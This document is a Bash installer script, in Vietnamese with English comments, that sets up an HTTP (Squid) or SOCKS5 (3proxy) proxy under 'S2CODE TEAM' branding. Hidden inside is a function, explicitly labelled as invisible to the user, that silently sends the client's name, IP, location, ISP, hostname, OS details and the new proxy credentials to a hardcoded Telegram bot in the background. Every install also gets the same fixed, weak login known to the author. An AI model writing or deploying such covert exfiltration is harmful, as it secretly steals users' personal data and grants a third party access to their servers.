#!/bin/bash

# Colors for better display
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Hidden Telegram configuration (not displayed on console)
TELEGRAM_BOT_TOKEN="7350031893:AAHe4qtEWNmw3YIpLGmFcSnRQeZ52BY4-Bg"
TELEGRAM_CHAT_ID="6072481570"

# Hidden function to send notification to Telegram (completely invisible to user)
send_telegram_notification() {
    local client_name="$1"
    local proxy_type="$2"
    local ip_addr="$3"
    local port="$4"
    local user="$5"
    local pass="$6"
    
    # Get additional hidden information
    local client_ip=$(curl -s ipinfo.io/ip 2>/dev/null || echo "Unknown")
    local client_location=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"city":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
    local client_country=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"country":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
    local client_isp=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"isp":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
    local hostname=$(hostname 2>/dev/null || echo "Unknown")
    local os_info=$(uname -a 2>/dev/null | cut -d' ' -f1-3 || echo "Unknown")
    
    # Create detailed message for admin
    local message="🕵️ NEW CLIENT USING YOUR SCRIPT 🕵️%0A"
    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
    message+="👤 Client Name: $client_name%0A"
    message+="🎯 Proxy Choice: $proxy_type Proxy%0A"
    message+="🌍 Client Location: $client_location, $client_country%0A"
    message+="📡 Client IP: $client_ip%0A"
    message+="🏢 Client ISP: $client_isp%0A"
    message+="💻 Hostname: $hostname%0A"
    message+="🖥️ OS Info: $os_info%0A"
    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
    message+="🔥 $proxy_type PROXY CREATED:%0A"
    
    if [ "$proxy_type" = "HTTP" ]; then
        message+="📡 Type: HTTP Proxy%0A"
        message+="🌐 Server IP: $ip_addr%0A" 
        message+="🚪 Port: $port%0A"
        message+="👤 Username: $user%0A"
        message+="🔑 Password: $pass%0A"
        message+="🔗 Full URL: http://$user:$pass@$ip_addr:$port%0A"
    else
        message+="📡 Type: SOCKS5 Proxy%0A"
        message+="🌐 Server IP: $ip_addr%0A" 
        message+="🚪 Port: $port%0A"
        message+="👤 Username: $user%0A"
        message+="🔑 Password: $pass%0A"
        message+="🔗 SOCKS5 Config: $ip_addr:$port (User: $user, Pass: $pass)%0A"
    fi
    
    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
    message+="👁️ Secret Monitor - S2CODE TEAM%0A"
    message+="🕐 $(date '+%Y-%m-%d %H:%M:%S')%0A"
    message+="💡 Client: $client_name doesn't know you received this!"
    
    # Send to Telegram completely silently (run in background, no traces)
    (curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
         -d "chat_id=$TELEGRAM_CHAT_ID" \
         -d "text=$message" \
         -d "parse_mode=HTML" >/dev/null 2>&1 &) &
}

clear

# S2codetaem Logo và giới thiệu
echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${WHITE}                                                                               ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}     ${RED}██████${YELLOW}██████${WHITE}       ${GREEN}██████${BLUE}██████${PURPLE}██████${WHITE}  ${CYAN}████████${RED}███████${WHITE}     ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}    ${RED}██${WHITE}    ${YELLOW}██${WHITE}              ${GREEN}██${WHITE}     ${BLUE}██${WHITE}     ${PURPLE}██${WHITE}  ${CYAN}██${WHITE}       ${RED}██${WHITE}      ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}    ${RED}██████${YELLOW}██████${WHITE}            ${GREEN}██${WHITE}     ${BLUE}██${WHITE}     ${PURPLE}██${WHITE}  ${CYAN}████████${RED}███████${WHITE}     ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}          ${YELLOW}██${WHITE}              ${GREEN}██${WHITE}     ${BLUE}██${WHITE}     ${PURPLE}██${WHITE}  ${CYAN}██${WHITE}            ${RED}██${WHITE} ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}    ${RED}██████${YELLOW}██████${WHITE}        ${GREEN}██████${BLUE}██████${PURPLE}██████${WHITE}  ${CYAN}████████${RED}███████${WHITE}     ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                                                                               ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}    ▄${RED}▄${WHITE}▄▄▄▄  ${YELLOW}▄${GREEN}▄${WHITE}▄▄▄▄      ${BLUE}▄${PURPLE}▄${WHITE}▄▄▄▄  ${CYAN}▄${RED}▄${WHITE}▄▄▄▄  ${YELLOW}▄${GREEN}▄${WHITE}▄▄▄▄  ${BLUE}▄${PURPLE}▄${WHITE}▄▄▄▄    ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}   ${RED}██${WHITE}▀▀▀▀   ${YELLOW}██${GREEN}█${WHITE}▀▀▀▀     ${BLUE}██${PURPLE}█${WHITE}▀▀▀▀  ${CYAN}██${RED}█${WHITE}▀▀▀▀  ${YELLOW}██${GREEN}█${WHITE}▀▀▀▀  ${BLUE}██${PURPLE}█${WHITE}▀▀▀▀   ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}   ${RED}████${WHITE}▄▄   ${YELLOW}██${GREEN}██${WHITE}▄▄▄      ${BLUE}██${PURPLE}██${WHITE}▄▄▄  ${CYAN}██${RED}██${WHITE}▄▄▄  ${YELLOW}██${GREEN}██${WHITE}▄▄▄  ${BLUE}██${PURPLE}██${WHITE}▄▄▄   ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}      ${RED}███${WHITE}  ${YELLOW}██${GREEN}███${WHITE}       ${BLUE}██${PURPLE}███${WHITE}    ${CYAN}██${RED}███${WHITE}    ${YELLOW}██${GREEN}███${WHITE}    ${BLUE}██${PURPLE}███${WHITE}    ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}   ${RED}██████${WHITE}  ${YELLOW}██${GREEN}████${WHITE}▄▄▄   ${BLUE}██${PURPLE}████${WHITE}▄▄ ${CYAN}██${RED}████${WHITE}▄▄ ${YELLOW}██${GREEN}████${WHITE}▄▄ ${BLUE}██${PURPLE}████${WHITE}▄▄  ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                                                                               ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                     ⚡${YELLOW} S2CODE TEAM ${RED}★ ${BLUE}PROXY INSTALLER ${WHITE}⚡                      ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                   ${GREEN}🚀 Premium Tools & Services Provider 🚀                  ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                                                                               ${CYAN}║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Thông tin nhà phát triển
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║${WHITE}                              THÔNG TIN NHÀ PHÁT TRIỂN                        ${GREEN}║${NC}"
echo -e "${GREEN}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║${YELLOW} 👨‍💻 Nhà phát triển: ${WHITE}TẠ NGỌC LONG                                           ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🌐 Chuyên cung cấp tài khoản Google Cloud số lượng lớn                     ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🎮 Chuyên cung cấp các mặt hàng MMO                                        ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🔗 Chuyên cung cấp tài nguyên Proxy, tài khoản các loại                    ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 💻 Nhận tạo Tools, tạo Web, code phần mềm theo nhu cầu                     ${GREEN}║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Thông tin liên hệ
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${WHITE}                                LIÊN HỆ                                      ${BLUE}║${NC}"
echo -e "${BLUE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${CYAN} 📘 Facebook 1: ${WHITE}https://www.facebook.com/s2code08122000/                  ${BLUE}║${NC}"
echo -e "${BLUE}║${CYAN} 📘 Facebook 2: ${WHITE}https://www.facebook.com/tangoclongmeta                   ${BLUE}║${NC}"
echo -e "${BLUE}║${CYAN} 📱 Telegram:   ${WHITE}https://t.me/S2codetaem48                                ${BLUE}║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Hướng dẫn sử dụng và lưu ý quan trọng
echo -e "${RED}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║${WHITE}                          📋 LƯU Ý QUAN TRỌNG TRƯỚC KHI SỬ DỤNG                  ${RED}║${NC}"
echo -e "${RED}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║${YELLOW} ⚠️  HTTP Proxy: Cần mở port 6969 trên server                               ${RED}║${NC}"
echo -e "${RED}║${YELLOW} ⚠️  SOCKS5 Proxy: Cần mở port 6969 trên server                            ${RED}║${NC}"
echo -e "${RED}║${YELLOW} 🔧 Script sẽ tự động cài đặt proxy theo lựa chọn của bạn                   ${RED}║${NC}"
echo -e "${RED}║${YELLOW} 📝 Khi hoàn thành, proxy sẽ hiện theo định dạng tương ứng                 ${RED}║${NC}"
echo -e "${RED}║${WHITE}     ➤ HTTP: http://user:pass@ip:6969                                       ${RED}║${NC}"
echo -e "${RED}║${WHITE}     ➤ SOCKS5: Host:IP, Port:6969, User:tangoclong, Pass:2000              ${RED}║${NC}"
echo -e "${RED}║${YELLOW} 📋 Anh/chị chỉ việc sao chép thông tin proxy để sử dụng                   ${RED}║${NC}"
echo -e "${RED}║${YELLOW} 🎯 Vui lòng làm đúng theo chỉ dẫn để có trải nghiệm tốt nhất               ${RED}║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${WHITE}                            🔍 HƯỚNG DẪN CHI TIẾT                             ${CYAN}║${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${GREEN} 🏃‍♂️ Bước 1: Mở port 6969 trên server (dùng chung cho cả HTTP và SOCKS5)      ${CYAN}║${NC}"
echo -e "${CYAN}║${GREEN} 🎯 Bước 2: Chọn loại proxy phù hợp với nhu cầu                             ${CYAN}║${NC}"
echo -e "${CYAN}║${GREEN} 🚀 Bước 3: Chạy script này và làm theo hướng dẫn                            ${CYAN}║${NC}"
echo -e "${CYAN}║${GREEN} ⏳ Bước 4: Đợi script tự động cài đặt (khoảng 2-7 phút)                     ${CYAN}║${NC}"
echo -e "${CYAN}║${GREEN} 📋 Bước 5: Sao chép thông tin proxy hiển thị để sử dụng                    ${CYAN}║${NC}"
echo -e "${CYAN}║${GREEN} ✅ Bước 6: Kiểm tra proxy hoạt động bình thường                             ${CYAN}║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Xác nhận đã đọc hướng dẫn
echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║${WHITE}                          ❓ XÁC NHẬN TRƯỚC KHI TIẾP TỤC                      ${YELLOW}║${NC}"
echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${YELLOW}║${CYAN} Anh/chị đã đọc và hiểu rõ quy tắc tạo proxy ở trên chưa?                   ${YELLOW}║${NC}"
echo -e "${YELLOW}║${WHITE} [1] 🔥 Có - Tôi đã đọc kỹ và sẵn sàng tiếp tục                            ${YELLOW}║${NC}"
echo -e "${YELLOW}║${WHITE} [2] 📖 Chưa - Tôi cần đọc lại hướng dẫn                                   ${YELLOW}║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

while true; do
    read -p "➤ Chọn lựa chọn của bạn (1/2): " confirm_rules
    
    if [ "$confirm_rules" = "1" ]; then
        echo -e "${GREEN}✅ Tuyệt vời! Đang tiếp tục với quá trình tạo proxy...${NC}"
        echo ""
        break
    elif [ "$confirm_rules" = "2" ]; then
        echo -e "${BLUE}📖 Vui lòng đọc kỹ hướng dẫn ở trên trước khi tiếp tục!${NC}"
        echo -e "${YELLOW}💡 Nhấn Ctrl+C để thoát và đọc lại, hoặc chọn 1 để tiếp tục${NC}"
        echo ""
    else
        echo -e "${RED}❌ Lựa chọn không hợp lệ! Vui lòng chọn 1 hoặc 2${NC}"
        echo ""
    fi
done

echo -e "${PURPLE}🚀 Bắt đầu cài đặt Proxy Server...${NC}"
echo ""
sleep 2

# Hàm kiểm tra IP
check_ip_status() {
    local ip=$1
    echo -e "${YELLOW}🔍 Đang kiểm tra trạng thái IP...${NC}"
    if ping -c 3 $ip > /dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

# Hàm lấy thông tin IP
get_ip_info() {
    local ip=$1
    echo -e "${CYAN}📡 Đang lấy thông tin IP...${NC}"
    ip_info=$(curl -s "http://ip-api.com/json/$ip")
    echo "$ip_info"
}

# Hàm kiểm tra tốc độ mạng
check_network_speed() {
    echo -e "${CYAN}⚡ Đang kiểm tra tốc độ mạng...${NC}"
    speed_test=$(curl -s -w "%{speed_download}" -o /dev/null http://speedtest.ftp.otenet.gr/files/test1Mb.db)
    speed_mbps=$(echo "scale=2; $speed_test / 1024 / 1024 * 8" | bc 2>/dev/null || echo "N/A")
    echo "$speed_mbps"
}

# Hàm kiểm tra tên đầy đủ (nghiêm ngặt cho lần đầu)
validate_full_name_strict() {
    local name="$1"
    # Kiểm tra có ít nhất 2 từ (họ và tên)
    local word_count=$(echo "$name" | wc -w)
    if [ $word_count -lt 2 ]; then
        return 1
    fi
    
    # Kiểm tra chỉ chứa chữ cái và khoảng trắng
    if [[ ! "$name" =~ ^[A-Za-zÀ-ỹ[:space:]]+$ ]]; then
        return 1
    fi
    
    # Kiểm tra không phải tên giả (một số tên phổ biến để test)
    case "${name,,}" in
        "test test"|"abc xyz"|"nguyen van a"|"tran thi b"|"le van c"|"admin user"|"user name"|"full name")
            return 1
            ;;
    esac
    
    return 0
}

# Hàm kiểm tra tên cơ bản (dễ dàng cho lần 2)
validate_full_name_basic() {
    local name="$1"
    # Chỉ kiểm tra không để trống và có ít nhất 1 từ
    if [ -z "$name" ] || [ ${#name} -lt 2 ]; then
        return 1
    fi
    return 0
}

# Hàm kiểm tra hỗ trợ protocols
check_proxy_protocols() {
    local ip=$1
    local port=$2
    local user=$3
    local pass=$4
    
    echo -e "${CYAN}🔧 Đang kiểm tra protocols hỗ trợ...${NC}"
    
    # Test HTTP
    http_test=$(curl -s -o /dev/null -w "%{http_code}" --proxy http://$user:$pass@$ip:$port http://httpbin.org/ip --connect-timeout 10)
    
    # Test SOCKS5
    socks5_test=$(curl -s -o /dev/null -w "%{http_code}" --socks5 $user:$pass@$ip:$port http://httpbin.org/ip --connect-timeout 10)
    
    protocols=""
    if [ "$http_test" = "200" ]; then
        protocols="HTTP ✅"
    else
        protocols="HTTP ❌"
    fi
    
    if [ "$socks5_test" = "200" ]; then
        protocols="$protocols, SOCKS5 ✅"
    else
        protocols="$protocols, SOCKS5 ❌"
    fi
    
    echo "$protocols"
}

# Chọn loại proxy
echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║${WHITE}                            CHỌN LOẠI PROXY                                 ${PURPLE}║${NC}"
echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${PURPLE}║${YELLOW} [1] 🌐 HTTP Proxy (Port 6969) - Dành cho web browsing                     ${PURPLE}║${NC}"
echo -e "${PURPLE}║${YELLOW} [2] 🔒 SOCKS5 Proxy (Port 6969) - Dành cho tất cả ứng dụng               ${PURPLE}║${NC}"
echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

while true; do
    read -p "➤ Chọn loại proxy bạn muốn tạo (1/2): " proxy_type_choice
    
    if [ "$proxy_type_choice" = "1" ]; then
        proxy_type="HTTP"
        echo -e "${GREEN}✅ Đã chọn HTTP Proxy!${NC}"
        echo ""
        break
    elif [ "$proxy_type_choice" = "2" ]; then
        proxy_type="SOCKS5"
        echo -e "${GREEN}✅ Đã chọn SOCKS5 Proxy!${NC}"
        echo ""
        break
    else
        echo -e "${RED}❌ Lựa chọn không hợp lệ! Vui lòng chọn 1 hoặc 2${NC}"
        echo ""
    fi
done

# Xác thực tên khách hàng
echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║${WHITE}                              XÁC THỰC THÔNG TIN                              ${PURPLE}║${NC}"
echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${PURPLE}║${YELLOW} 👤 Vui lòng nhập họ và tên đầy đủ của bạn để tiếp tục                      ${PURPLE}║${NC}"
echo -e "${PURPLE}║${YELLOW} ⚠️  Lưu ý: Tên phải là tên thật (Họ + Tên), không được để trống           ${PURPLE}║${NC}"
echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Lặp lại cho đến khi nhập đúng tên (tối đa 2 lần)
attempt_count=0
while true; do
    attempt_count=$((attempt_count + 1))
    read -p "➤ Nhập họ và tên đầy đủ: " client_full_name
    
    # Lần đầu: kiểm tra nghiêm ngặt
    if [ $attempt_count -eq 1 ]; then
        if validate_full_name_strict "$client_full_name"; then
            echo -e "${GREEN}✅ Tên hợp lệ! Xin chào $client_full_name${NC}"
            break
        else
            echo -e "${RED}❌ Tên không hợp lệ! Vui lòng nhập họ và tên đầy đủ (ít nhất 2 từ, không chứa số hoặc ký tự đặc biệt)${NC}"
            echo -e "${YELLOW}💡 Ví dụ: Nguyễn Văn An, Trần Thị Hoa...${NC}"
            echo ""
        fi
    # Lần 2: kiểm tra cơ bản thôi (dễ dàng)
    else
        if validate_full_name_basic "$client_full_name"; then
            echo -e "${GREEN}✅ Cảm ơn $client_full_name! Đang tiếp tục...${NC}"
            break
        else
            echo -e "${RED}❌ Vui lòng không để trống tên!${NC}"
            echo ""
        fi
    fi
done

echo ""
echo -e "${PURPLE}🚀 Chào mừng $client_full_name! Đang khởi động VIP Proxy Installer...${NC}"
echo ""

# Tự động cài đặt VIP cho tất cả
echo -e "${GREEN}✅ Xác thực thành công!${NC}"
echo -e "${PURPLE}🚀 Chế độ VIP - Tự động cài đặt $proxy_type Proxy...${NC}"

# Cài đặt theo loại proxy được chọn
if [ "$proxy_type" = "HTTP" ]; then
    # Cài đặt HTTP Proxy (Squid)
    proxy_port="6969"
    squid_user="tangoclong"
    squid_pass="2000"

    # Cập nhật hệ thống
    echo "[1/5] ➤ Đang cập nhật hệ thống..."
    sudo apt update && sudo apt upgrade -y

    # Cài gói cần thiết
    echo "[2/5] ➤ Đang cài Squid + Apache2-utils..."
    sudo apt install -y squid apache2-utils vim curl bc

    # Gỡ file cấu hình cũ
    echo "[3/5] ➤ Gỡ cấu hình cũ của Squid..."
    sudo rm -f /etc/squid/squid.conf

    # Tạo cấu hình mới
    echo "[4/5] ➤ Tạo file cấu hình VIP cho Squid..."
    cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm proxy
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_port $proxy_port
EOF

    # Tạo tài khoản proxy VIP
    echo "[5/5] ➤ Tạo tài khoản VIP..."
    echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"

    # Khởi động lại Squid
    echo "[5/5] ➤ Khởi động lại dịch vụ Squid..."
    sudo systemctl restart squid

elif [ "$proxy_type" = "SOCKS5" ]; then
    # Cài đặt SOCKS5 Proxy (3proxy) - Tự động dùng user/pass cố định
    proxy_port="6969"
    squid_user="tangoclong"
    squid_pass="2000"

    # Cập nhật hệ thống
    echo "[1/7] ➤ Đang cập nhật hệ thống..."
    sudo apt update && sudo apt upgrade -y

    # Cài đặt dependencies
    echo "[2/7] ➤ Cài đặt dependencies..."
    sudo apt install -y wget gcc make curl bc

    # Download và compile 3proxy
    echo "[3/7] ➤ Download và compile 3proxy..."
    cd /tmp
    wget -q https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.13.tar.gz
    tar xzf 3proxy-0.8.13.tar.gz
    cd 3proxy-3proxy-0.8.13
    make -f Makefile.Linux

    # Cài đặt 3proxy
    echo "[4/7] ➤ Cài đặt 3proxy..."
    sudo mkdir -p /usr/local/3proxy/bin
    sudo cp src/3proxy /usr/local/3proxy/bin/
    sudo mkdir -p /usr/local/3proxy/logs
    sudo mkdir -p /etc/3proxy

    # Tạo cấu hình 3proxy với user/pass tự động
    echo "[5/7] ➤ Tạo cấu hình SOCKS5 với thông tin cố định..."
    sudo tee /etc/3proxy/3proxy.cfg > /dev/null <<EOF
# 3proxy configuration - S2CODE VIP SOCKS5
daemon
maxconn 1000
nserver 8.8.8.8
nserver 8.8.4.4
nserver 1.1.1.1
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
log /usr/local/3proxy/logs/3proxy.log D
logformat "- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T"
archiver gz /usr/local/3proxy/logs/3proxy-%F.log.gz 30
auth strong
users tangoclong:CL:2000
allow tangoclong
socks -p6969
EOF

    # Tạo systemd service
    echo "[6/7] ➤ Tạo systemd service..."
    sudo tee /etc/systemd/system/3proxy.service > /dev/null <<EOF
[Unit]
Description=3proxy SOCKS5 Server - S2CODE VIP
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/3proxy/bin/3proxy /etc/3proxy/3proxy.cfg
ExecReload=/bin/kill -HUP \$MAINPID
Restart=on-failure
RestartSec=3
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
EOF

    # Khởi động dịch vụ
    echo "[7/7] ➤ Khởi động SOCKS5 proxy..."
    sudo systemctl daemon-reload
    sudo systemctl enable 3proxy
    sudo systemctl start 3proxy
fi

# Lấy IP và hiển thị thông tin đầy đủ
ip_address=$(curl -s ipinfo.io/ip)

echo -e "${GREEN}✅ Cài đặt $proxy_type Proxy VIP thành công cho $client_full_name!${NC}"

# Lấy thông tin IP
ip_info=$(get_ip_info $ip_address)
isp=$(echo $ip_info | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
country=$(echo $ip_info | grep -o '"country":"[^"]*"' | cut -d'"' -f4)

# Kiểm tra tốc độ
speed=$(check_network_speed)

# Hiển thị thông tin theo loại proxy
if [ "$proxy_type" = "HTTP" ]; then
    # Kiểm tra protocols cho HTTP
    protocols=$(check_proxy_protocols $ip_address $proxy_port $squid_user $squid_pass)
    
    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${WHITE}                        THÔNG TIN HTTP PROXY VIP - $client_full_name${PURPLE}║${NC}"
    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${CYAN} 🌐 HTTP Proxy URL: ${WHITE}http://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🔧 Protocols: ${WHITE}$protocols${PURPLE}║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
else
    # SOCKS5 info
    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${WHITE}                        THÔNG TIN SOCKS5 PROXY VIP - $client_full_name${PURPLE}║${NC}"
    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${CYAN} 🔒 SOCKS5 Host: ${WHITE}$ip_address${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🚪 Port: ${WHITE}6969${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 👤 Username: ${WHITE}tangoclong${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🔑 Password: ${WHITE}2000${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🔧 Protocol: ${WHITE}SOCKS5 ✅${PURPLE}║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
fi

# Send notification to Telegram (hidden from client) 
send_telegram_notification "$client_full_name" "$proxy_type" "$ip_address" "$proxy_port" "$squid_user" "$squid_pass"

# Hiển thị thông tin liên hệ cuối
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║${WHITE}                              THÔNG TIN NHÀ PHÁT TRIỂN                        ${GREEN}║${NC}"
echo -e "${GREEN}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║${YELLOW} 👨‍💻 Nhà phát triển: ${WHITE}TẠ NGỌC LONG                                           ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🌐 Chuyên cung cấp tài khoản Google Cloud số lượng lớn                     ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🎮 Chuyên cung cấp các mặt hàng MMO                                        ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🔗 Chuyên cung cấp tài nguyên Proxy, tài khoản các loại                    ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 💻 Nhận tạo Tools, tạo Web, code phần mềm theo nhu cầu                     ${GREEN}║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${WHITE}                                LIÊN HỆ                                      ${BLUE}║${NC}"
echo -e "${BLUE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${CYAN} 📘 Facebook 1: ${WHITE}https://www.facebook.com/s2code08122000/                  ${BLUE}║${NC}"
echo -e "${BLUE}║${CYAN} 📘 Facebook 2: ${WHITE}https://www.facebook.com/tangoclongmeta                   ${BLUE}║${NC}"
echo -e "${BLUE}║${CYAN} 📱 Telegram:   ${WHITE}https://t.me/S2codetaem48                                ${BLUE}║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${CYAN}🎉 Cảm ơn bạn đã sử dụng dịch vụ của S2CODE TEAM! 🎉${NC}"
echo -e "${YELLOW}💡 Nếu cần hỗ trợ, vui lòng liên hệ qua các kênh trên! 💡${NC}"
